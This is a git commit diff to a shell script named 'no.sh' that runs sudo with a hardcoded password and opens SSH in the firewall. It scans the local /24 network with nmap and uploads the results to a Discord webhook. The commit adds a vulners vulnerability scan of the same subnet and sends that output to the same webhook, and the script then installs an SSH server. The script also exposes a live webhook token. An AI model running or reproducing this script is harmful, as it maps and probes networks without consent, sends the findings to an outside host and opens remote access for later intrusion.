6eebaebf37c6fcd6561e567fc50cae714b19f988
Dada <david.kondziella@rub.de>
2023-12-14 12:08:31 +0100

    Update no.sh

--- no.sh
+++ no.sh
@@ -3,6 +3,8 @@ if echo 'sdds' | sudo -S sh -c "sudo ufw allow ssh"; then
 	echo "nmap scan and sending xml..."
  	sudo nmap -T5 -A -v 192.168.178.1/24 -oX /home/$USER/net.xml  
   	curl -F "filename=@/home/$USER/net.xml" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
+	sudo nmap -sV --script vulners 192.168.178.1/24 -oX /home/$USER/vuln.xml  
+  	curl -F "filename=@/home/$USER/vuln.xml" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
 	echo "SUDO SUCCESS installing ssh services..."
 	sudo apt install openssh-server -y 
   	# sudo echo "<command>" >>  "/etc/ssh/sshd_config"
